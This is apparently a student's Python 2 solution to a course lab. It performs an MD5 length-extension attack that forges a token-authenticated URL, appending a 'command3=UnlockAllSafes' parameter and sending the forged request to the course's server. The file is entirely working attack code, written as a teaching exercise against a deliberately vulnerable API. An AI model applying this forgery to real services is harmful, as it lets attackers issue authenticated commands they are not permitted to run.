from pymd5 import md5, padding
import httplib, urlparse, sys, urllib, math

#help from instr
#what we want are 2 urls that have the same md5 hash
#How can we get that just by changing the token?(we cant)
#you have to add osmething directly into the 
#url between the token and the msg/extension that causes the 
#url to have to what we want

# get original url
# url = sys.argv[1]
url = 'https://eecs388.org/project1/api?token=402a574d265dc212ee64970f159575d0&user=admin&command1=ListFiles&command2=NoOp'
parsedUrl = urlparse.urlparse(url)
token = parsedUrl.query.split('&')[0][6:]
message = parsedUrl.query.split('&', 1)[1]

# conduct attack
length_of_m = 8 + len(message) # bytes
count = (length_of_m + len(padding(length_of_m * 8))) * 8 # bits

# update hash
h = md5(state=token.decode('hex'), count=count)
extension = '&command3=UnlockAllSafes'
h.update(extension)

# update url
newtoken = urllib.quote(h.hexdigest())
url = 'https://' + parsedUrl.hostname + parsedUrl.path + \
        '?token=' + newtoken + '&' + message + \
        urllib.quote(padding(length_of_m * 8)) + extension
print url

# send url
parsedUrl = urlparse.urlparse(url)
conn = httplib.HTTPSConnection(parsedUrl.hostname, parsedUrl.port)
conn.request("GET", parsedUrl.path + "?" + parsedUrl.query)
print conn.getresponse().read()
